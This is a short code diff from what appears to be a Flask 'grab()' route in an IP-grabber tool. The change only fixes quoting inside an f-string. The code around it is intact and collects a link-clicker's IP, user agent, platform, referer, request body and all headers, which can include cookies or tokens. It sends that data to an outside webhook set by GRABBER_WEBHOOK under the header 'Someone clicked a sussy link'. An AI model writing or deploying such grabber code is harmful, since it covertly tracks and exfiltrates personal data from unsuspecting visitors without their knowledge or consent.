@@ -122,7 +122,7 @@ def grab():
 
     requests.post(
         os.getenv("GRABBER_WEBHOOK"), 
-json={"content": f"## Someone clicked a sussy link on the internet!!\n\n```IP: {visitorIP}\nUser Agent: {userAgent}\nPlatform: {platform}\nReferer: {referer}\nRequest Body: {request.get_data() if request.content_length < 750 else "Data too long"}\nAll headers: {request.headers}```"}
+json={"content": f"## Someone clicked a sussy link on the internet!!\n\n```IP: {visitorIP}\nUser Agent: {userAgent}\nPlatform: {platform}\nReferer: {referer}\nRequest Body: {request.get_data() if request.content_length < 750 else 'Data too long'}\nAll headers: {request.headers}```"}
     )
     return {"IP": visitorIP, "UserAgent": userAgent, "Platform": platform, "Referer": referer}
 
